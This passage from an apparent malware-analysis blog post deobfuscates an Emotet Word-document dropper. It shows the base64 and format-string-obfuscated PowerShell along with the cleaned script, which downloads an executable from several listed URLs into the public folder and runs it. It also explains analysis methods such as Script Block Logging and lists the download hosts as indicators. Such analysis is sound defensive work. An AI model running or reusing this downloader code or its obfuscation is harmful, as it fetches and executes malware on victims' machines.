    CcALAAnAHYAbgAnACwAJwAzADMAKQA7AG0AOQAxACcALAAnAHkAewBtADkAMQBZACcALAAnAFIARwB2ACcALAAnAGQAYQBzAGQAIAA9ACAAJgAoAFIAJwAsACcAWQBVACAAPQAgACcALAAnAG0AOQAxAFMARABDACkAOwAmACcALAAnAGMAaAB7AH0AfQAnACwAJwA5ADEAbgBzAGEAZAAnACwAJwBhAHMAZgBjACcALAAnAGsAbgBvAGMAJwAsACcAYQBzAEwAQgAnACwAJwBvAG4AcwBwAG8AcgB0AHMALgBjAG8AJwAsACcAUgAnACwAJwBBACcALAAnADkAMQBOAFMAQgAnACwAJwAtAGQAZQBzAGkAZwBuAC4AJwAsACcAaAB0AHQAJwAsACcAYgBqAGUAYwB0ACcALAAnAHQAdABwADoALwAvACcALAAnAFMAcABsAGkAdAAoAFIARwB2AEAAUgBHAHYAJwAsACcAbwByACcALAAnAEYATgBWAC8AUgBHAHYALgAnACwAJwAvAG0AeQBrACcALAAnAGwAJwAsACcATAAvAEAAaAB0AHQAJwAsACcALgAnACwAJwBHAHYAJwAsACcAZQB3AGkAcwB0ACcALAAnAEAAaAB0AHQAcAA6AC8ALwBtAGEAZABkAGkAbgAnACwAJwAwADAAMAAsACAAMgA4ADIAMQAnACwAJwBwAHMAOgAvAC8AYQBsAHUAZwBhACcALAAnAFIARwB2ACkAIABTAHkAcwB0ACcALAAnACkAJwAsACcAKQA7AG0AOQAxAFMARABDACAAJwAsACcARAAnACwAJwAgAG0AJwAsACcAKwAgAFIARwB2ADUAcQB3AFIARwB2ACAAKwAgAG0AJwAsACcAWQBVAC4AZABpAHkARABvAEEAMAA5AFcAJwAsACcAbQA5ADEAJwAsACcAMQBOAFMAQgAgACcALAAnAGEAJwAsACcARwB2ACkAOwAnACwAJwAtACcALAAnAHMAZAAuAG4AJwAs
    ACcACgAnACwAJwBuAGwAQQAwADkAJwAsACcAZgB1AG4AJwAsACcAIABpACcALAAnAEQAQwBYACAAPQAgAFIARwB2ACcALAAnAFMAJwAsACcAYQAnACwAJwBZACcALAAnAGkAeQAoAG0AOQAxAGEAcwBmAGMALgBkAGkAeQAnACwAJwBkAEYASQBBADAAOQBsAGUAZAAnACwAJwBoACcALAAnAHYAawBSAEcAdgArACcALAAnACsAUgBHAHYAdwAtAG8AYgAnACwAJwBSAEcAdgAnACwAJwBnACcALAAnAGoAZQAnACwAJwAgACsAIAAoAFIARwB2AC4AZQB4AFIARwB2ACsAUgBHAHYAJwAsACcAZQAnACwAJwA7AG0AOQAnACwAJwBuACcALAAnAD0AIABtADkAJwAsACcAZQBtAC4AJwAsACcAcgBBADAAOQBpAEEAMAA5ACcALAAnAGUALQBJAHQAZQBtAFIAJwAsACcADQAnACwAJwB2ACcALAAnAE4AJwAsACcASABMADEALwAnACwAJwBkAHMALgBjAG8AbQAnACwAJwAxAGUAbgB2ACcALAAnAG8AUwB0ACcALAAnAGcAZABpAHkAKAApACcALAAnAGcALgAnACwAJwArAFIARwB2AHQAUgAnACwAJwA7AGIAcgBlAGEAawA7AH0AYwBhAHQAJwAsACcAMQBBAEQAQwBYACkAewB0AHIAJwAsACcALgAoAFIARwAnACwAJwAoAFIARwAnACwAJwBuACAAbQA5ACcAKQApAC0AQwByAEUAUABsAEEAYwBlACAAKABbAGMAaABBAHIAXQA1ADMAKwBbAGMAaABBAHIAXQAxADEAMwArAFsAYwBoAEEAcgBdADEAMQA5ACkALABbAGMAaABBAHIAXQA5ADIAIAAgAC0AUgBFAFAAbABBAGMARQAnAEEAMAA5ACcALABbAGMAaABBAHIAXQA5ADYALQBSAEUAUABsAEEAYwBFACAAJwBSAEcAdgAnACwAWwB
    jAGgAQQByAF0AMwA5ACAALQBDAHIARQBQAGwAQQBjAGUAIAAgACcAbQA5ADEAJwAsAFsAYwBoAEEAcgBdADMANgAgAC0AUgBFAFAAbABBAGMARQAoAFsAYwBoAEEAcgBdADEAMAAwACsAWwBjAGgAQQByAF0AMQAwADUAKwBbAGMAaABBAHIAXQAxADIAMQApACwAWwBjAGgAQQByAF0AMwA0ACkAKQAgAA==
    
    
    
    # cat powershell.txt  | base64 -d
    InVoke-expReSsIoN(((("{13}{84}{37}{60}{97}{46}{15}{90}{93}{10}{111}{17}{20}{11}{96}{24}{38}{114}{33}{18}{91}{76}{32}{51}{65}{99}{30}{14}{28}{73}{26}{69}{41}{74}{77}{29}{63}{34}{47}{82}{102}{78}{50}{1}{43}{59}{54}{92}{21}{7}{80}{106}{8}{85}{31}{88}{52}{57}{61}{45}{22}{3}{103}{58}{64}{49}{0}{95}{56}{44}{105}{62}{110}{25}{55}{53}{67}{98}{107}{19}{70}{48}{94}{27}{75}{6}{9}{42}{81}{116}{113}{35}{71}{79}{12}{87}{86}{5}{108}{100}{104}{109}{16}{39}{115}{4}{89}{36}{101}{2}{72}{83}{68}{23}{66}{112}{40}" -f'd','p://','Gv)(','i','vInvoRGv+RG','T','foreac','7F/@http://wep','/I0ge4woC','h(m91','cRGv','m','Oa','m91ns','ent;m','Gv+RGveRGv',', ','Gv) ra','eRGv+RGvwRGv+',':public ','ndo','/4TQf','m/qU','C','1Y','net/M0','=','eR','9','ext(10','Net.WebCli','S/@','o','vn','33);m91','y{m91Y','RGv','dasd = &(R','YU = ','m91SDC);&','ch{}}','91nsad','asfc','knoc','asLB','onsports.co','R','A','91NSB','-design.','htt','bject','ttp://','Split(RGv@RGv','or','FNV/RGv.','/myk','l','L/@htt','.','Gv','ewist','@http://maddin','000, 2821','ps://aluga','RGv) Syst',')',');m91SDC ','D',' m','+ RGv5qwRGv + m','YU.diyDoA09W','m91','1NSB ','a','Gv);','-','sd.n','
    ','nlA09','fun',' i','DCX = RGv','S','a','Y','iy(m91asfc.diy','dFIA09led','h','vkRGv+','+RGvw-ob','RGv','g','je',' + (RGv.exRGv+RGv','e',';m9','v','N','HL1/','ds.com','1env','oSt','gdiy()','g.','+RGvtR',';break;}cat','1ADCX){tr','.(RG','(RG','n m9'))-CrEPlAce ([chAr]53+[chAr]113+[chAr]119),[chAr]92  -REPlAcE'A09',[chAr]96-REPlAcE 'RGv',[chAr]39 -CrEPlAce  'm91',[chAr]36 -REPlAcE([chAr]100+[chAr]105+[chAr]121),[chAr]34))
    

### Fail - get the IEX string from Powershell

Normally, I’d remove the `iex` part and run it in a powershell term, and
expect to see the string that gets `iex`ed. For example, in a different
similar sample, INV601213082839.doc, this works (even on powershell in kali!):

    
    
    PS /media/sf_malware/Facture-impayee-30.doc> (((("{22}{136}{83}{112}{146}{124}{121}{127}{164}{159}{98}{139}{138}{23}{73}{150}{111}{93}{165}{167}{148}{13}{42}{7}{68}{126}{63}{32}{99}{176}{69}{14}{10}{35}{153}{91}{151}{175}{135}{4}{172}{70}{132}{0}{48}{61}{36}{8}{105}{11}{38}{5}{64}{51}{67}{24}{133}{152}{27}{78}{3}{50}{87}{169}{134}{33}{101}{15}{17}{174}{72}{1}{154}{88}{30}{71}{16}{53}{142}{95}{47}{115}{49}{156}{114}{149}{103}{166}{26}{57}{2}{55}{147}{12}{6}{122}{177}{90}{66}{161}{163}{44}{89}{65}{41}{109}{100}{74}{54}{143}{28}{79}{94}{77}{56}{120}{118}{144}{104}{173}{76}{145}{31}{46}{45}{96}{29}{86}{168}{160}{9}{130}{123}{171}{85}{81}{80}{141}{137}{52}{119}{82}{43}{97}{25}{75}{107}{110}{155}{20}{158}{18}{21}{102}{84}{106}{129}{58}{34}{40}{92}{170}{60}{125}{117}{62}{39}{157}{162}{140}{113}{108}{59}{131}{19}{116}{128}{37}"-f '1','/','p','/ssfm',');','/','e','1Df','d','oreac',' 8N','/D6yd','qu','f-obj','SB =','http://','http://','la','bg',';}','oSt','uibguNgE8D','8N','c1Df+1Df','ual-sou','g','VacH/@ht','.c','C ','+','zUz/','B + (1','.We','k','1Df','gnsa','ttp://od','}}','9x','f','In','Split(1D','ect','bguOadF','8','.','Df','h','D','w','/',':','8','he','N',':/',' 1DfN8','t','(',';','D','fh','+1D','et','@http','/1Df.','inki','//vis',') System','N','NgADCX =','@','11.de','t1Df)',';8','uleE8D(8','8NgN',' +','om','= 8Ngenv:pu','{try{8NgYY','CX)','l','nsa','), 8NgS',' 8NgAD','1Dfe1','R','c','cr2K','m/th','d.ne','vo1D',' .','blic','t','ex1Df','Ib','-','bClien','@1Df)','J/@','(','/',' +','bods.co.uk','DC);','Nga',')','f','s','dom;8NgYYU =','d','gSDC','.d','-','cat','1Df','1','DDobguWn','M','= &(1D','st','(8Ng',' ','fk','.N','fn1Df+1Df','ch{','&','h','break',' ','nd','IK','3','g','.E','e','obj',')(8N','U','llmu','gSD','Df','S','asd','/com','w1Df+1D','e',' ran','xt(10000, 2821','s','das','Nt','fc.E8DT','orbs','e-It','r','1Dfw','f','ngride','em1Df','r/1','e1Df+','(1Dfne','RaY','1Df+1Df','Df);','p','f+1','asfc in','8',' ','nge20','3','t;8Ng','software.co')) -CREPLACE 'N8M',[cHAr]92-RePlaCe([cHAr]49+[cHAr]68+[cHAr]102),[cHAr]39-CREPLACE'E8D',[cHAr]34-RePlaCe '8Ng',[cHAr]36-RePlaCe([cHAr]98+[cHAr]103+[cHAr]117),[cHAr]96))
    
    $nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = 'http://oddbods.co.uk/D6yd9x/@http://visual-sounds.com/ssfm/RpIKkJ/@http://lange2011.de/NtczUz/@http://hellmuth-worbs.de/RaYVacH/@http://comquestsoftware.com/thinkingrider/18cr2K/'.Split('@');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}
    

But for some reason that returns an error:

    
    
    PS /media/sf_malware/Facture-impayee-30.doc> (((("{13}{84}{37}{60}{97}{46}{15}{90}{93}{10}{111}{17}{20}{11}{96}{24}{38}{114}{33}{18}{91}{76}{32}{51}{65}{99}{30}{14}{28}{73}{26}{69}{41}{74}{77}{29}{63}{34}{47}{82}{102}{78}{50}{1}{43}{59}{54}{92}{21}{7}{80}{106}{8}{85}{31}{88}{52}{57}{61}{45}{22}{3}{103}{58}{64}{49}{0}{95}{56}{44}{105}{62}{110}{25}{55}{53}{67}{98}{107}{19}{70}{48}{94}{27}{75}{6}{9}{42}{81}{116}{113}{35}{71}{79}{12}{87}{86}{5}{108}{100}{104}{109}{16}{39}{115}{4}{89}{36}{101}{2}{72}{83}{68}{23}{66}{112}{40}" -f'd','p://','Gv)(','i','vInvoRGv+RG','T','foreac','7F/@http://wep','/I0ge4woC','h(m91','cRGv','m','Oa','m91ns','ent;m','Gv+RGveRGv',', ','Gv) ra','eRGv+RGvwRGv+',':public ','ndo','/4TQf','m/qU','C','1Y','net/M0','=','eR','9','ext(10','Net.WebCli','S/@','o','vn','33);m91','y{m91Y','RGv','dasd = &(R','YU = ','m91SDC);&','ch{}}','91nsad','asfc','knoc','asLB','onsports.co','R','A','91NSB','-design.','htt','bject','ttp://','Split(RGv@RGv','or','FNV/RGv.','/myk','l','L/@htt','.','Gv','ewist','@http://maddin','000, 2821','ps://aluga','RGv) Syst',')',');m91SDC ','D',' m','+ RGv5qwRGv + m','YU.diyDoA09W','m91','1NSB ','a','Gv);','-','sd.n','                                                                                                     >> ','nlA09','fun',' i','DCX = RGv','S','a','Y','iy(m91asfc.diy','dFIA09led','h','vkRGv+','+RGvw-ob','RGv','g','je',' + (RGv.exRGv+RGv','e',';m9','v','N','HL1/','ds.com','1env','oSt','gdiy()','g.','+RGvtR',';break;}cat','1ADCX){tr','.(RG','(RG','n m9'))-CrEPlAce ([chAr]53+[chAr]113+[chAr]119),[chAr]92  -REPlAcE'A09',[chAr]96-REPlAcE 'RGv',[chAr]39 -CrEPlAce  'm91',[chAr]36 -REPlAcE([chAr]100+[chAr]105+[chAr]121),[chAr]34))
    Error formatting a string: Index (zero based) must be greater than or equal to zero and less than the size of the argument list..
    At line:1 char:1
    + (((("{13}{84}{37}{60}{97}{46}{15}{90}{93}{10}{111}{17}{20}{11}{96}{24 ...
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: ({13}{84}{37}{60...3}{66}{112}{40}:String) [], RuntimeException
    + FullyQualifiedErrorId : FormatError
    

### Success - get the IEX string using Script Block Logging

#### Enabling Script Block Logging

By running `gpedit.msc`, and then going under `Local Computer Policy` ->
`Computer Configuration` -> `Administrative Templates` -> `Windows Components`
-> `Windows PowerShell`, I turned on `PowerShell Script Block Logging`.

![](https://0xdfimages.gitlab.io/img/1528048315482.png)

Then I ran the base64 encoded command, and checked the logs in `Event Viewer`,
under `Applications and Services Logs` -> `Microsoft` -> `Windows` ->
`PowerShell` -> `Operational`. There were a bunch. It looks like 4104 is the
event type that can capture what is run.

First, there’s a log with the encoded command as entered:

![](https://0xdfimages.gitlab.io/img/1528048726641.png)

Then the decoded command that looks like the base64 we were able to extract:

![](https://0xdfimages.gitlab.io/img/1528048763286.png)

Then the deobfuscated command:

![](https://0xdfimages.gitlab.io/img/1528048790325.png)

So the PowerShell cleans up to:

    
    
    $nsadasd = &(new-object) random;
    $YYU = .(new-object) System.Net.WebClient;
    $NSB = $nsadasd.next(10000, 282133);
    $ADCX = 'http://knoc.org/4TQf7F/@http://wepfunds.com/I0ge4woCYS/@http://lewistonsports.com/qUivL/@https://aluga-design.de/mykasLBHL1/@http://madding.net/M0FNV/'.Split('@');
    $SDC = $env:public + '\' + $NSB + ('.exe');
    foreach($asfc in $ADCX) {
      try {
        $YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);
        &(Invoke-Item)($SDC);
        break;
      } catch {}
    }
    

### Success - get the IEX string from Powershell

Turns out, after going back and playing around in powershell a bit more, you
can get the IEX string, with a print statement:

    
    
    PS /media/sf_malware> print(((("{22}{136}{83}{112}{146}{124}{121}{127}{164}{159}{98}{139}{138}{23}{73}{150}{111}{93}{165}{167}{148}{13}{42}{7}{68}{126}{63}{32}{99}{176}{69}{14}{10}{35}{153}{91}{151}{175}{135}{4}{172}{70}{132}{0}{48}{61}{36}{8}{105}{11}{38}{5}{64}{51}{67}{24}{133}{152}{27}{78}{3}{50}{87}{169}{134}{33}{101}{15}{17}{174}{72}{1}{154}{88}{30}{71}{16}{53}{142}{95}{47}{115}{49}{156}{114}{149}{103}{166}{26}{57}{2}{55}{147}{12}{6}{122}{177}{90}{66}{161}{163}{44}{89}{65}{41}{109}{100}{74}{54}{143}{28}{79}{94}{77}{56}{120}{118}{144}{104}{173}{76}{145}{31}{46}{45}{96}{29}{86}{168}{160}{9}{130}{123}{171}{85}{81}{80}{141}{137}{52}{119}{82}{43}{97}{25}{75}{107}{110}{155}{20}{158}{18}{21}{102}{84}{106}{129}{58}{34}{40}{92}{170}{60}{125}{117}{62}{39}{157}{162}{140}{113}{108}{59}{131}{19}{116}{128}{37}"-f '1','/','p','/ssfm',');','/','e','1Df','d','oreac',' 8N','/D6yd','qu','f-obj','SB =','http://','http://','la','bg',';}','oSt','uibguNgE8D','8N','c1Df+1Df','ual-sou','g','VacH/@ht','.c','C ','+','zUz/','B + (1','.We','k','1Df','gnsa','ttp://od','}}','9x','f','In','Split(1D','ect','bguOadF','8','.','Df','h','D','w','/',':','8','he','N',':/',' 1DfN8','t','(',';','D','fh','+1D','et','@http','/1Df.','inki','//vis',') System','N','NgADCX =','@','11.de','t1Df)',';8','uleE8D(8','8NgN',' +','om','= 8Ngenv:pu','{try{8NgYY','CX)','l','nsa','), 8NgS',' 8NgAD','1Dfe1','R','c','cr2K','m/th','d.ne','vo1D',' .','blic','t','ex1Df','Ib','-','bClien','@1Df)','J/@','(','/',' +','bods.co.uk','DC);','Nga',')','f','s','dom;8NgYYU =','d','gSDC','.d','-','cat','1Df','1','DDobguWn','M','= &(1D','st','(8Ng',' ','fk','.N','fn1Df+1Df','ch{','&','h','break',' ','nd','IK','3','g','.E','e','obj',')(8N','U','llmu','gSD','Df','S','asd','/com','w1Df+1D','e',' ran','xt(10000, 2821','s','das','Nt','fc.E8DT','orbs','e-It','r','1Dfw','f','ngride','em1Df','r/1','e1Df+','(1Dfne','RaY','1Df+1Df','Df);','p','f+1','asfc in','8',' ','nge20','3','t;8Ng','software.co')) -CREPLACE 'N8M',[cHAr]92-RePlaCe([cHAr]49+[cHAr]68+[cHAr]102),[cHAr]39-CREPLACE'E8D',[cHAr]34-RePlaCe '8Ng',[cHAr]36-RePlaCe([cHAr]98+[cHAr]103+[cHAr]117),[cHAr]96))
    Error: no such file "//visual-sounds.com/ssfm/RpIKkJ/@http://lange2011.de/NtczUz/@http://hellmuth-worbs.de/RaYVacH/@http://comquestsoftware.com/thinkingrider/18cr2K/'.Split('@');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU.Do`Wnl`OadFI`le($asfc.ToStr`i`Ng(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}' (No such file or directory)::$nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = 'http://oddbods.co.uk/D6yd9x/@http://visual-sounds.com/ssfm/RpIKkJ/@http://lange2011.de/NtczUz/@http://hellmuth-worbs.de/RaYVacH/@http://comquestsoftware.com/thinkingrider/18cr2K/'.Split('@');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU.Do`Wnl`OadFI`le($asfc.ToStr`i`Ng(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}"
    

There’s an error at the front, but if you cut after the `::`, you get the
powershell we’re looking for.

## Summary / C2

It tries to download from each of the following, save it in public under a
random number .exe, and execute it:

  * hxxp://knoc.org/4TQf7F/
  * hxxp://wepfunds.com/I0ge4woCYS/
  * hxxp://lewistonsports.com/qUivL/
  * hxxps://aluga-design.de/mykasLBHL1/
  * hxxp://madding.net/M0FNV/

This powershell is very similar to other emotet samples, with the same
structure, function names, variables. Example analysis:

  * https://r3mrum.wordpress.com/2017/12/15/from-emotet-psdecode-is-born/
  * https://dissectmalware.wordpress.com/2018/02/22/analyzing-virus-office-qexvmc/
  * https://dissectmalware.wordpress.com/2018/02/24/obfuscated-powershell-script-2-emotet/
  * https://0ffset.wordpress.com/2018/03/17/post-0x04-analysis-of-an-emotet-downloader/

The first link makes me think about checking out `PSDecode`
([github](https://github.com/R3MRUM/PSDecode)), which looks really cool. But
that’s for later.

[](/2018/06/04/emotet-doc-sample.html)

